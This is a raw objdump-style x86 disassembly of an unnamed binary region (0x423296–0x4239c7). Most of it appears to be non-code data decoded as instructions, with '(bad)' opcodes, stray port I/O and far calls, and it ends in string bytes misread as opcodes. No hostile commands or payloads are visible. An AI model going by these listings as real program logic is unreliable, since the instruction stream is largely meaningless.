  423296:	bound  eax,QWORD PTR [eax]
  423298:	add    BYTE PTR [eax],al
  42329a:	sub    DWORD PTR [ebx-0x2a],ebp
  42329d:	rcl    BYTE PTR [esi+0xd],cl
  4232a0:	fsub   QWORD PTR [eax-0x65]
  4232a3:	lods   al,BYTE PTR ds:[esi]
  4232a4:	ja     0x4232b4
  4232a6:	in     al,0x2e
  4232a8:	push   edi
  4232a9:	outs   dx,DWORD PTR ds:[esi]
  4232aa:	mov    ebx,cs
  4232ac:	xor    BYTE PTR [edx-0x6e],bl
  4232af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232b0:	xor    ebp,DWORD PTR [ecx-0x57155a27]
  4232b6:	lahf   
  4232b7:	mov    dh,0x8b
  4232b9:	dec    esi
  4232ba:	(bad)  
  4232bb:	dec    esp
  4232bc:	sbb    ecx,DWORD PTR [edx+0x36875b50]
  4232c2:	and    DWORD PTR [eax+0x16],ebx
  4232c5:	inc    ecx
  4232c6:	or     eax,0x179350
  4232cb:	jge    0x4232ef
  4232cd:	dec    edi
  4232ce:	out    0xec,al
  4232d0:	inc    esi
  4232d1:	cmp    edx,edi
  4232d3:	mov    WORD PTR [eax],es
  4232d5:	mov    al,ds:0xbea7af0
  4232da:	ret    
  4232db:	xor    BYTE PTR [edi-0xf],0x6e
  4232df:	inc    esi
  4232e0:	outs   dx,BYTE PTR ds:[esi]
  4232e1:	adc    DWORD PTR [ecx+0x77],esp
  4232e4:	or     BYTE PTR [eax-0x2a8abb5e],0x78
  4232eb:	add    BYTE PTR [esi-0x3ac45ffe],ah
  4232f1:	sbb    eax,edi
  4232f3:	outs   dx,BYTE PTR ds:[esi]
  4232f4:	inc    esi
  4232f5:	sbb    cl,BYTE PTR ds:0x7e2f73d6
  4232fb:	bound  eax,QWORD PTR [eax]
  4232fd:	add    BYTE PTR [eax],al
  4232ff:	add    BYTE PTR [eax],al
  423301:	add    BYTE PTR [esi],dl
  423303:	aad    0xdf
  423305:	out    dx,eax
  423306:	fucomip st,st(7)
  423308:	ss std 
  42330a:	cmp    BYTE PTR [esi-0x45dea0c6],al
  423310:	inc    ebx
  423311:	sub    eax,0x1df13
  423316:	bound  eax,QWORD PTR [eax]
  423318:	add    BYTE PTR [eax],al
  42331a:	call   0xaddd:0x79c1e9fb
  423321:	ret    
  423322:	or     DWORD PTR [ebx-0x42b47c98],0x1e
  423329:	rcr    DWORD PTR [edi+0x61],0x39
  42332d:	in     al,0x80
  42332f:	rol    DWORD PTR [edi+0x62],1
  423332:	loopne 0x4232c3
  423334:	pop    ss
  423335:	sub    BYTE PTR [edx],dh
  423337:	mov    eax,ds:0xf1857fec
  42333c:	rcr    DWORD PTR [esi+0x33e9621e],1
  423342:	or     BYTE PTR [ecx-0x3e],0x33
  423346:	cmp    esp,edx
  423348:	fisub  WORD PTR [esi]
  42334a:	add    BYTE PTR [eax-0x6c894cc],ch
  423350:	ins    DWORD PTR es:[edi],dx
  423351:	test   dl,0x47
  423354:	lods   eax,DWORD PTR ds:[esi]
  423355:	mov    dl,0x47
  423357:	jmp    0xe4a06da
  42335c:	aad    0x76
  42335e:	xchg   ecx,eax
  42335f:	pop    ebx
  423360:	push   esi
  423361:	addr16 (bad) 
  423363:	mov    ch,0xb8
  423365:	test   BYTE PTR [ecx*2+0x73418602],cl
  42336c:	mov    cl,0x4a
  42336e:	fst    DWORD PTR [edi+0x34784dea]
  423374:	cmp    DWORD PTR [ecx],edi
  423376:	test   dh,bh
  423378:	cmp    al,0x18
  42337a:	lock inc esp
  42337c:	add    BYTE PTR [eax],al
  42337e:	add    BYTE PTR [eax],al
  423380:	add    BYTE PTR [eax],al
  423382:	outs   dx,BYTE PTR ds:[esi]
  423383:	jbe    0x423369
  423385:	retf   0xdafc
  423388:	outs   dx,BYTE PTR ds:[esi]
  423389:	neg    BYTE PTR [eax]
  42338b:	xchg   edx,eax
  42338c:	xchg   DWORD PTR [edi-0x5d93c9f0],edx
  423392:	jne    0x423373
  423394:	add    DWORD PTR [eax],eax
  423396:	bound  eax,QWORD PTR [eax]
  423398:	add    BYTE PTR [eax],al
  42339a:	pushf  
  42339b:	test   DWORD PTR [edi+0x5df8b242],ebx
  4233a1:	add    ch,BYTE PTR [esi]
  4233a3:	push   DWORD PTR ss:[ecx-0x48]
  4233a7:	jo     0x423353
  4233a9:	ins    BYTE PTR es:[edi],dx
  4233aa:	inc    ecx
  4233ab:	retf   
  4233ac:	xchg   ebx,eax
  4233ad:	ja     0x42332f
  4233af:	aas    
  4233b0:	mov    dl,0xc1
  4233b2:	add    DWORD PTR [edx],ecx
  4233b4:	mov    ch,0x82
  4233b6:	mov    ebx,0xc50bfd50
  4233bb:	pop    ss
  4233bc:	and    ebx,DWORD PTR [eax-0x67c5e820]
  4233c2:	out    0xca,al
  4233c4:	jbe    0x4233bc
  4233c6:	mov    ?,WORD PTR [edi]
  4233c8:	dec    esi
  4233c9:	les    edx,FWORD PTR [ecx-0x19]
  4233cc:	and    DWORD PTR [eax-0x6596f2ca],edi
  4233d2:	mov    WORD PTR [esi],?
  4233d4:	jb     0x4233ef
  4233d6:	fist   DWORD PTR [eax+0x4ccd8bd9]
  4233dc:	jnp    0x42339b
  4233de:	xchg   edi,eax
  4233df:	cmp    cl,BYTE PTR [ebp+0xf3a376c]
  4233e5:	out    0xc5,eax
  4233e7:	cmp    al,0xc2
  4233e9:	loopne 0x423372
  4233eb:	les    ecx,FWORD PTR [ebp-0x10d9d368]
  4233f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f2:	xor    eax,0xd2bb3564
  4233f7:	sbb    ebx,DWORD PTR [edi+0x8]
  4233fa:	repnz dec eax
  4233fc:	add    BYTE PTR [eax],al
  4233fe:	add    BYTE PTR [eax],al
  423400:	add    BYTE PTR [eax],al
  423402:	cmp    dl,BYTE PTR [edx-0x3c]
  423405:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42340c:	nop
  42340d:	shl    DWORD PTR [esi+edi*8-0x202861fd],cl
  423414:	add    DWORD PTR [eax],eax
  423416:	bound  eax,QWORD PTR [eax]
  423418:	add    BYTE PTR [eax],al
  42341a:	fmul   QWORD PTR [ebx-0x51]
  42341d:	inc    ebp
  42341e:	adc    bl,dh
  423420:	pop    ds
  423421:	mov    bh,0xf3
  423423:	imul   esp,DWORD PTR [eax],0x1ebc017b
  423429:	lods   al,BYTE PTR ds:[esi]
  42342a:	inc    DWORD PTR [edx]
  42342c:	xchg   BYTE PTR [edi+ebp*2+0xe6ded4b],bh
  423433:	sbb    BYTE PTR [ebx+eax*4],0x38
  423437:	into   
  423438:	fwait
  423439:	ins    DWORD PTR es:[edi],dx
  42343a:	or     dh,BYTE PTR [ecx-0x4cdbe8cd]
  423440:	rcr    eax,1
  423442:	pop    ds
  423443:	call   0x6008:0x79789768
  42344a:	dec    ebx
  42344b:	jno    0x4234bc
  42344d:	(bad)  
  42344f:	sub    eax,0xfc43d35e
  423454:	jl     0x42342c
  423456:	jg     0x423484
  423458:	imul   eax,edx,0x624aaa06
  42345e:	mov    cl,0xdf
  423460:	dec    edx
  423461:	mov    ebx,0xbc1c09c9
  423466:	int3   
  423467:	(bad)  
  423468:	aas    
  423469:	add    BYTE PTR ds:0xe38ea60,cl
  42346f:	std    
  423470:	popa   
  423471:	ret    0x55ae
  423474:	pop    eax
  423475:	pop    edi
  423476:	ins    DWORD PTR es:[edi],dx
  423477:	fsubrp st(1),st
  423479:	ror    BYTE PTR [ebp+0x53],cl
  42347f:	add    BYTE PTR [eax],al
  423481:	add    BYTE PTR [ebx-0x4293427d],dl
  423487:	jle    0x42345c
  423489:	call   DWORD PTR [eax-0x20]
  42348c:	cli    
  42348d:	call   0xe039:0x2c6fd617
  423494:	add    DWORD PTR [eax],eax
  423496:	bound  eax,QWORD PTR [eax]
  423498:	add    BYTE PTR [eax],al
  42349a:	rcl    dh,1
  42349c:	call   0xc3ca:0xe6a9b895
  4234a3:	fimul  WORD PTR [esi+0x1e53ee17]
  4234a9:	dec    esi
  4234aa:	pusha  
  4234ab:	ret    0x63d0
  4234ae:	mov    ch,0x8e
  4234b0:	xchg   ebp,eax
  4234b1:	cmp    edx,DWORD PTR [ebx-0x439df323]
  4234b7:	div    BYTE PTR [edx-0x6ae2bcf5]
  4234bd:	not    esi
  4234bf:	dec    esp
  4234c0:	clc    
  4234c1:	dec    edx
  4234c2:	cdq    
  4234c3:	cmp    eax,0x84d23f63
  4234c8:	outs   dx,BYTE PTR ds:[esi]
  4234c9:	in     al,dx
  4234ca:	icebp  
  4234cb:	fnstenv [edi+0x149007d1]
  4234d1:	div    DWORD PTR [esi+0x1f]
  4234d4:	shr    DWORD PTR [ecx-0x14552c4d],cl
  4234da:	js     0x4234d7
  4234dc:	mov    eax,0xdb712a3b
  4234e1:	test   eax,0xec6867a0
  4234e6:	aad    0x15
  4234e8:	inc    esi
  4234e9:	or     eax,0x9ef7eb96
  4234ee:	ror    ch,0x50
  4234f1:	xlat   BYTE PTR ds:[ebx]
  4234f2:	in     al,0x56
  4234f4:	sub    bh,BYTE PTR [ebx-0xa]
  4234f7:	mov    esp,0x69ffa893
  4234fc:	add    BYTE PTR [eax],al
  4234fe:	add    BYTE PTR [eax],al
  423500:	add    BYTE PTR [eax],al
  423502:	(bad)  
  423504:	test   eax,0xddffeef7
  42350a:	and    al,0x1
  42350c:	pop    ebp
  42350d:	dec    edi
  42350e:	dec    edx
  42350f:	arpl   si,bp
  423511:	sub    al,0x9b
  423513:	loopne 0x423516
  423515:	add    BYTE PTR [edx+0x0],ah
  423518:	add    BYTE PTR [eax],al
  42351a:	ret    
  42351b:	ret    0xbb8c
  42351e:	hlt    
  42351f:	mov    ebx,0x113a270a
  423524:	mov    ds:0x6f2599fd,al
  423529:	(bad)  
  42352a:	idiv   DWORD PTR cs:[ebp+0x66]
  42352e:	inc    esp
  42352f:	jmp    0xb01:0xd6752b61
  423536:	mov    edx,0xd0386aec
  42353b:	cs add al,0xc2
  42353e:	mov    DWORD PTR ds:[edx],0xb87c29ad
  423545:	fnstcw WORD PTR [eax-0x4d]
  423548:	ror    BYTE PTR [edx+eax*1-0x6f],1
  42354c:	dec    ecx
  42354d:	xlat   BYTE PTR ds:[ebx]
  42354e:	lea    ebp,[eax]
  423550:	jne    0x4235bd
  423552:	pop    ss
  423553:	loopne 0x423513
  423555:	lahf   
  423556:	in     eax,0x5f
  423558:	or     DWORD PTR [ebx+0xe],esi
  42355b:	mov    ebx,0x73168e5c
  423560:	scas   al,BYTE PTR es:[edi]
  423561:	or     DWORD PTR [edi+0x65],eax
  423564:	test   eax,esi
  423566:	jbe    0x423582
  423568:	pop    eax
  423569:	mov    ds:0xaaf43375,al
  42356e:	mov    ds:0x92d3b17,eax
  423573:	sahf   
  423574:	and    edx,DWORD PTR [edi+0x5453746]
  42357a:	inc    edi
  42357b:	xchg   esp,eax
  42357c:	add    BYTE PTR [eax],al
  42357e:	add    BYTE PTR [eax],al
  423580:	add    BYTE PTR [eax],al
  423582:	outs   dx,DWORD PTR ds:[esi]
  423583:	mov    ds:0x7edd2ad4,al
  423588:	jmp    edi
  42358a:	push   edx
  42358b:	fcmovu st,st(5)
  42358d:	in     eax,0x70
  42358f:	call   0x1:0xe0fdbca2
  423596:	bound  eax,QWORD PTR [eax]
  423598:	add    BYTE PTR [eax],al
  42359a:	(bad)  
  42359b:	in     al,0x39
  42359d:	das    
  42359e:	jl     0x423602
  4235a0:	fwait
  4235a1:	cld    
  4235a2:	sub    DWORD PTR [ebx],ebx
  4235a4:	stos   BYTE PTR es:[edi],al
  4235a5:	add    edx,ebp
  4235a7:	repz pop ebx
  4235a9:	mov    dl,0x2e
  4235ab:	scas   eax,DWORD PTR es:[edi]
  4235ac:	mov    esi,0x4078c4a
  4235b1:	out    dx,eax
  4235b2:	(bad)  
  4235b3:	loop   0x4235d0
  4235b5:	push   ecx
  4235b6:	xchg   ebx,eax
  4235b7:	sub    al,0xc1
  4235b9:	push   esp
  4235ba:	jbe    0x42355e
  4235bc:	and    al,0x9d
  4235be:	loop   0x4235d4
  4235c0:	mov    es,WORD PTR [edx+0x60c1beb6]
  4235c6:	cli    
  4235c7:	out    0x57,al
  4235c9:	mov    esp,eax
  4235cb:	mul    BYTE PTR cs:[edi]
  4235ce:	inc    edx
  4235cf:	pop    ds
  4235d0:	ss pop esp
  4235d2:	int    0x3a
  4235d4:	dec    DWORD PTR [edx]
  4235d6:	jp     0x42355f
  4235d8:	dec    edi
  4235d9:	cmp    esp,DWORD PTR [edi+0x66ec17af]
  4235df:	enter  0x5924,0x82
  4235e3:	test   al,0xe2
  4235e5:	push   ebx
  4235e6:	pop    esi
  4235e7:	push   ss
  4235e8:	bound  edi,QWORD PTR [esi+0x9070047]
  4235ee:	inc    ebx
  4235ef:	rol    esp,0xa4
  4235f2:	shl    DWORD PTR ds:0x71025bc,0x7
  4235f9:	dec    esi
  4235fa:	dec    esp
  4235fb:	out    dx,al
  4235fc:	add    BYTE PTR [eax],al
  4235fe:	add    BYTE PTR [eax],al
  423600:	add    BYTE PTR [eax],al
  423602:	stc    
  423603:	sbb    al,al
  423605:	inc    esi
  423606:	jecxz  0x4235e6
  423608:	(bad)  
  423609:	mov    edi,0xe1f1bc83
  42360e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42360f:	outs   dx,BYTE PTR ds:[esi]
  423610:	daa    
  423611:	push   eax
  423612:	pop    edi
  423613:	loope  0x423616
  423615:	add    BYTE PTR [edx+0x0],ah
  423618:	add    BYTE PTR [eax],al
  42361a:	imul   BYTE PTR [eax+0x46ed1d13]
  423620:	daa    
  423621:	jmp    0x423675
  423623:	in     al,0xa7
  423625:	inc    edx
  423626:	or     esp,ecx
  423628:	lds    esp,FWORD PTR [ebp-0x25]
  42362b:	dec    edi
  42362c:	push   es
  42362d:	pop    ds
  42362e:	xor    BYTE PTR ds:0xc20be502,al
  423634:	mov    edx,0x38b8e17
  423639:	int    0xf7
  42363b:	jmp    0x423673
  42363d:	cs pop ss
  42363f:	lds    eax,FWORD PTR [eiz*8+0x33e10af0]
  423646:	push   edi
  423647:	mov    ch,0xd0
  423649:	les    ecx,FWORD PTR [edx]
  42364b:	retf   0x6c90
  42364e:	ja     0x42368f
  423650:	mov    BYTE PTR [edi+0x31581b01],al
  423656:	dec    ebx
  423657:	inc    edi
  423658:	push   ss
  423659:	dec    ecx
  42365a:	mov    ds:0x52ef6413,al
  42365f:	jge    0x4236ad
  423661:	push   cs
  423662:	dec    ecx
  423663:	jp     0x423654
  423665:	test   eax,0x8ccafcf4
  42366a:	sbb    dl,bh
  42366c:	pop    esi
  42366d:	loop   0x423654
  42366f:	sbb    cl,BYTE PTR [esi+0x207a0182]
  423675:	pushf  
  423676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423677:	jne    0x4236c2
  423679:	lds    esp,FWORD PTR [edx]
  42367b:	cmp    DWORD PTR [eax],eax
  42367d:	add    BYTE PTR [eax],al
  42367f:	add    BYTE PTR [eax],al
  423681:	add    BYTE PTR [ecx+0x3e8336b9],ah
  423687:	(bad)  
  423688:	mov    ch,0xbb
  42368a:	icebp  
  42368b:	and    eax,0x51dc8c27
  423690:	pop    esi
  423691:	ins    BYTE PTR es:[edi],dx
  423692:	shl    ecx,0x1
  423695:	add    BYTE PTR [edx+0x0],ah
  423698:	add    BYTE PTR [eax],al
  42369a:	xor    eax,0x47c627ee
  42369f:	(bad)  
  4236a1:	lock aaa 
  4236a3:	sub    al,0x78
  4236a5:	xor    DWORD PTR [eax+0x50],esi
  4236a8:	std    
  4236a9:	daa    
  4236aa:	fisubr DWORD PTR [ebp+esi*8-0x25894bca]
  4236b1:	cmp    BYTE PTR [ebp+0x75db35b3],bl
  4236b7:	adc    edx,DWORD PTR [esi-0xde91853]
  4236bd:	xchg   ebx,eax
  4236be:	arpl   ax,bx
  4236c0:	and    bl,BYTE PTR [edi-0x6d]
  4236c3:	retf   
  4236c4:	xchg   ebx,eax
  4236c5:	mov    ebp,0x9d1d407c
  4236ca:	or     DWORD PTR [ebx+ebx*2+0x2c],eax
  4236ce:	outs   dx,BYTE PTR ds:[esi]
  4236cf:	sub    ecx,DWORD PTR [edi]
  4236d1:	icebp  
  4236d2:	push   edi
  4236d3:	mov    esi,DWORD PTR [edx-0x5d28d6ea]
  4236d9:	(bad)  
  4236da:	aad    0x62
  4236dc:	and    DWORD PTR ds:0xcff0f5e4,ebp
  4236e2:	outs   dx,BYTE PTR ds:[esi]
  4236e3:	dec    ebp
  4236e4:	outs   dx,BYTE PTR ds:[esi]
  4236e5:	jno    0x4236a1
  4236e7:	cmp    ebp,DWORD PTR [ebx-0x7e]
  4236ea:	test   DWORD PTR [eax-0x61],edx
  4236ed:	mov    WORD PTR [ecx],ss
  4236ef:	jno    0x423678
  4236f1:	(bad)  
  4236f2:	outs   dx,BYTE PTR ds:[esi]
  4236f3:	push   0xae6e53d5
  4236f8:	arpl   WORD PTR [ebp+0x46],bx
  4236fb:	cmp    BYTE PTR [eax],al
  4236fd:	add    BYTE PTR [eax],al
  4236ff:	add    BYTE PTR [eax],al
  423701:	add    BYTE PTR [edx],dl
  423703:	xlat   BYTE PTR ds:[ebx]
  423704:	repz or esi,edi
  423707:	das    
  423708:	cli    
  423709:	fist   WORD PTR [ecx]
  42370b:	dec    ebx
  42370c:	es nop
  42370e:	adc    ah,BYTE PTR ds:[edi+0x1e223a4]
  423715:	add    BYTE PTR [edx+0x0],ah
  423718:	add    BYTE PTR [eax],al
  42371a:	xor    edi,ebx
  42371c:	inc    edi
  42371d:	mov    WORD PTR [ebx+ebx*1+0x77],ds
  423721:	push   0xffffff85
  423723:	sar    dl,cl
  423725:	outs   dx,BYTE PTR ds:[esi]
  423726:	aas    
  423727:	add    ah,ah
  423729:	ret    
  42372a:	sti    
  42372b:	pop    ds
  42372c:	jge    0x4236b0
  42372e:	push   es
  42372f:	lds    ebx,FWORD PTR [edx+eiz*4-0x63]
  423733:	inc    eax
  423734:	pop    ss
  423735:	mov    esi,0xcbe7888a
  42373a:	mov    ecx,DWORD PTR [edi]
  42373c:	loopne 0x42379b
  42373e:	xchg   BYTE PTR ds:0x13218b4d,bh
  423744:	push   edi
  423745:	jnp    0x42379a
  423747:	mov    esp,0x10613b47
  42374c:	mov    cl,0xed
  42374e:	sbb    al,0x12
  423750:	aad    0x5e
  423752:	inc    ecx
  423753:	and    BYTE PTR [edi],0xe6
  423756:	xchg   esp,eax
  423757:	mov    dl,0x7b
  423759:	adc    esi,DWORD PTR [edi+0x7e833137]
  42375f:	xor    ah,BYTE PTR [ebx]
  423761:	and    al,0x94
  423763:	and    BYTE PTR [eax],al
  423765:	mov    ecx,0xbae44e84
  42376a:	mov    dh,0xad
  42376c:	test   BYTE PTR [ebp-0x7ec05ef6],cl
  423772:	in     al,0x4b
  423774:	xlat   BYTE PTR ds:[ebx]
  423775:	push   esp
  423776:	inc    ecx
  423777:	ror    BYTE PTR [ebp+0x6ff529],cl
  42377d:	add    BYTE PTR [eax],al
  42377f:	add    BYTE PTR [eax],al
  423781:	add    BYTE PTR [edx],dl
  423783:	mov    edx,0xe6f8c6d8
  423788:	push   ds
  423789:	(bad)  
  42378a:	adc    bl,dh
  42378c:	cwde   
  42378d:	out    dx,al
  42378e:	adc    BYTE PTR [esi-0x38],0xf9
  423792:	test   edx,esp
  423794:	add    DWORD PTR [eax],eax
  423796:	bound  eax,QWORD PTR [eax]
  423798:	add    BYTE PTR [eax],al
  42379a:	push   esi
  42379b:	inc    esp
  42379c:	xchg   DWORD PTR ds:0x56f9d179,ecx
  4237a2:	and    ecx,0xc93d85ba
  4237a8:	(bad)  
  4237aa:	inc    ebx
  4237ab:	lods   al,BYTE PTR ds:[esi]
  4237ac:	sbb    eax,0x9e8e4283
  4237b1:	xor    esp,DWORD PTR [ebx+0x3d]
  4237b4:	std    
  4237b5:	test   eax,0x3bba6523
  4237ba:	out    dx,al
  4237bb:	adc    bh,0x8c
  4237be:	or     edi,edi
  4237c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237c1:	dec    esp
  4237c2:	mov    ah,0x1c
  4237c4:	cmp    eax,0x41ad48c4
  4237c9:	mov    ds:0x9fdc9a21,eax
  4237ce:	shl    DWORD PTR [esi-0x6dde8221],1
  4237d4:	xor    eax,0xa1dfcee8
  4237d9:	arpl   WORD PTR [edi+eax*8+0x21],di
  4237dd:	dec    esi
  4237de:	sub    eax,0x30e8198a
  4237e3:	std    
  4237e4:	pop    ss
  4237e5:	sbb    ebx,DWORD PTR [edx]
  4237e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237e8:	cli    
  4237e9:	inc    eax
  4237ea:	adc    ecx,DWORD PTR [edi+eax*8]
  4237ed:	xchg   ebp,eax
  4237ee:	or     BYTE PTR [ebp-0x320be7ee],ch
  4237f4:	dec    ebp
  4237f5:	scas   eax,DWORD PTR es:[edi]
  4237f6:	test   BYTE PTR [eax],bh
  4237f8:	xchg   ebp,eax
  4237f9:	fwait
  4237fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4237fb:	je     0x4237fd
  4237fd:	add    BYTE PTR [eax],al
  4237ff:	add    BYTE PTR [eax],al
  423801:	add    BYTE PTR [eax],al
  423803:	rol    BYTE PTR [edx+0x0],0x4
  423807:	rol    BYTE PTR [edx+0x0],0x8
  42380b:	rol    BYTE PTR [edx+0x0],0xc
  42380f:	rol    BYTE PTR [edx+0x0],0x10
  423813:	rol    BYTE PTR [edx+0x0],0x14
  423817:	rol    BYTE PTR [edx+0x0],0x18
  42381b:	rol    BYTE PTR [edx+0x0],0x1c
  42381f:	rol    BYTE PTR [edx+0x0],0x57
  423823:	inc    edi
  423824:	cmp    DWORD PTR [edi+0x41],ebx
  423827:	pop    eax
  423828:	ss push esi
  42382a:	pop    edi
  42382b:	cmp    BYTE PTR [eax],al
  42382d:	inc    ebx
  42382e:	inc    ebp
  42382f:	dec    esp
  423830:	pop    edi
  423831:	pop    eax
  423832:	push   edi
  423833:	dec    eax
  423834:	inc    edx
  423835:	add    BYTE PTR [edi+0x50],dl
  423838:	xor    eax,0x4641365f
  42383d:	cmp    DWORD PTR [edx],esi
  42383f:	xor    ebx,DWORD PTR [edi+0x32]
  423842:	aaa    
  423843:	add    BYTE PTR [eax+0x48],dl
  423846:	xor    BYTE PTR [edi+0x58],bl
  423849:	push   esp
  42384a:	inc    ecx
  42384b:	dec    ebp
  42384c:	push   ecx
  42384d:	pop    edi
  42384e:	inc    esi
  42384f:	push   ebp
  423850:	cmp    DWORD PTR [eax],eax
  423852:	push   edi
  423853:	push   ebp
  423854:	inc    ecx
  423855:	xor    dh,BYTE PTR [ebx]
  423857:	xor    ebx,DWORD PTR [edi+0x4e]
  42385a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42385e:	cmp    DWORD PTR [edi+0x38],ebx
  423861:	dec    ecx
  423862:	cmp    DWORD PTR [edx+0x36],ebx
  423865:	pop    edi
  423866:	dec    edx
  423867:	xor    BYTE PTR [edx+0x34],cl
  42386a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42386e:	xor    esi,DWORD PTR [eax]
  423870:	pop    edi
  423871:	inc    edx
  423872:	dec    ebx
  423873:	pop    eax
  423874:	pop    eax
  423875:	xor    eax,0x51414d00
  42387a:	pop    edi
  42387b:	inc    ecx
  42387c:	xor    al,BYTE PTR [ebp+0x5f]
  42387f:	inc    ecx
  423880:	dec    ebx
  423881:	cmp    DWORD PTR ds:0x5a003939,esi
  423887:	inc    ebp
  423888:	cmp    BYTE PTR [edi+0x4d],bl
  42388b:	ss dec eax
  42388d:	dec    ebx
  42388e:	add    BYTE PTR [ebp+0x57],al
  423891:	xor    DWORD PTR [edi+0x31],ebx
  423894:	dec    ebx
  423895:	xor    eax,DWORD PTR [ecx+0x30]
  423898:	push   ebx
  423899:	add    BYTE PTR [edx+esi*1+0x36],al
  42389d:	aaa    
  42389e:	pop    edi
  42389f:	push   edx
  4238a0:	dec    eax
  4238a1:	dec    ebp
  4238a2:	cmp    BYTE PTR [edi+0x37],bl
  4238a5:	inc    esi
  4238a6:	xor    eax,0x43355500
  4238ab:	pop    edi
  4238ac:	pop    ecx
  4238ad:	dec    ecx
  4238ae:	push   ebx
  4238af:	xor    bl,BYTE PTR [edi+0x52]
  4238b2:	add    BYTE PTR [eax+0x55],dl
  4238b5:	dec    ecx
  4238b6:	xor    BYTE PTR [edi+0x43],bl
  4238b9:	ss inc ebp
  4238bb:	xor    bl,BYTE PTR [edi+0x4d]
  4238be:	xor    al,0x4a
  4238c0:	push   edx
  4238c1:	push   ebp
  4238c2:	add    BYTE PTR [esi+0x39],cl
  4238c5:	push   eax
  4238c6:	pop    edi
  4238c7:	push   ebp
  4238c8:	cmp    DWORD PTR [esi],esi
  4238ca:	xor    BYTE PTR [ecx],dh
  4238cc:	pop    edi
  4238cd:	dec    edi
  4238ce:	dec    esi
  4238cf:	push   esp
  4238d0:	cmp    BYTE PTR [eax],al
  4238d2:	dec    esp
  4238d3:	xor    al,0x44
  4238d5:	xor    DWORD PTR [edi+0x4b],ebx
  4238d8:	xor    DWORD PTR [ebp+0x5f],eax
  4238db:	pop    edx
  4238dc:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238e0:	pop    edi
  4238e1:	inc    edx
  4238e2:	xor    dh,BYTE PTR [ecx]
  4238e4:	push   ebx
  4238e5:	xor    DWORD PTR [ecx],edi
  4238e7:	inc    edx
  4238e8:	add    BYTE PTR [edi+0x45],al
  4238eb:	xor    al,0x38
  4238ed:	xor    BYTE PTR [eax],dh
  4238ef:	pop    edi
  4238f0:	dec    edx
  4238f1:	dec    ebx
  4238f2:	xor    eax,0x33345f4d
  4238f7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238fb:	pop    edi
  4238fc:	aaa    
  4238fd:	push   esi
  4238fe:	dec    ebx
  4238ff:	push   edx
  423900:	pop    edi
  423901:	inc    ebx
  423902:	add    BYTE PTR [edx+0x35],bl
  423905:	dec    ebp
  423906:	pop    edi
  423907:	inc    edi
  423908:	dec    esi
  423909:	xor    al,0x49
  42390b:	xor    eax,0x54590035
  423910:	push   edx
  423911:	pop    edi
  423912:	push   esp
  423913:	inc    ebx
  423914:	inc    ecx
  423915:	pop    edi
  423916:	cmp    DWORD PTR [ecx+0x41],ebx
  423919:	push   ebp
  42391a:	pop    edi
  42391b:	push   ebp
  42391c:	inc    ebp
  42391d:	add    BYTE PTR [esi+esi*1+0x35],cl
  423921:	pop    edi
  423922:	pop    eax
  423923:	dec    edx
  423924:	inc    edx
  423925:	inc    edi
  423926:	add    BYTE PTR [edx+0x36],al
  423929:	inc    ebx
  42392a:	pop    edi
  42392b:	xor    BYTE PTR ds:0x36464b,dh
  423931:	dec    ebx
  423932:	cmp    DWORD PTR [esi+0x37],eax
  423935:	xor    ebx,DWORD PTR [edi+0x35]
  423938:	ss inc edi
  42393a:	pop    ecx
  42393b:	dec    eax
  42393c:	pop    ecx
  42393d:	add    BYTE PTR [ebp+0x35],cl
  423940:	push   eax
  423941:	xor    BYTE PTR [edi+0x4f],bl
  423944:	pop    ecx
  423945:	xor    cl,BYTE PTR [edi+0x0]
  423948:	pop    ecx
  423949:	xor    DWORD PTR [esi+0x5f],ecx
  42394c:	xor    al,BYTE PTR [edx+0x30]
  42394f:	push   esi
  423950:	push   esp
  423951:	inc    ebp
  423952:	add    BYTE PTR [edi+0x37],al
  423955:	push   esi
  423956:	xor    DWORD PTR [edi+0x49],ebx
  423959:	xor    al,BYTE PTR [esi+0x30]
  42395c:	pop    edi
  42395d:	ss dec esi
  42395f:	cmp    BYTE PTR [eax],al
  423961:	pop    edx
  423962:	xor    eax,0x445f334b
  423967:	xor    BYTE PTR [eax],bh
  423969:	push   ecx
  42396a:	push   esi
  42396b:	xor    al,0x0
  42396d:	push   ebp
  42396e:	pop    eax
  42396f:	inc    edi
  423970:	xor    DWORD PTR [edi+0x39],ebx
  423973:	push   esp
  423974:	inc    ebx
  423975:	aaa    
  423976:	inc    esp
  423977:	add    BYTE PTR [edi+0x39],dl
  42397a:	ss pop edi
  42397c:	dec    eax
  42397d:	pop    edx
  42397e:	pop    ecx
  42397f:	inc    edi
  423980:	push   ebp
  423981:	pop    edi
  423982:	push   eax
  423983:	dec    eax
  423984:	inc    ebx
  423985:	add    BYTE PTR [ebp+0x0],dl
  423988:	xor    al,0x0
  42398a:	dec    edi
  42398b:	add    BYTE PTR [edi+0x0],bl
  42398e:	cmp    BYTE PTR [eax],al
  423990:	xor    al,BYTE PTR [eax]
  423992:	inc    ebx
  423993:	add    BYTE PTR [edx+0x0],bl
  423996:	inc    ebx
  423997:	add    BYTE PTR [edi],dh
  423999:	add    BYTE PTR [edi+0x0],bl
  42399c:	inc    ebx
  42399d:	add    BYTE PTR [eax+eax*1+0x0],al
  4239a1:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4239a5:	add    BYTE PTR [edx],dh
  4239a7:	add    BYTE PTR [edi+0x0],bl
  4239aa:	cmp    BYTE PTR [eax],al
  4239ac:	dec    esp
  4239ad:	add    BYTE PTR [esi+0x0],dl
  4239b0:	pop    edi
  4239b1:	add    BYTE PTR [ecx+0x0],bl
  4239b4:	push   edx
  4239b5:	add    BYTE PTR [esi+0x0],dl
  4239b8:	xor    al,BYTE PTR [eax]
  4239ba:	cmp    BYTE PTR [eax],al
  4239bc:	pop    edi
  4239bd:	add    BYTE PTR [edx+0x0],cl
  4239c0:	add    BYTE PTR [eax],al
  4239c2:	inc    edx
  4239c3:	add    BYTE PTR [eax+eax*1+0x46],cl
  4239c7:	add    BYTE PTR [edi+0x0],bl
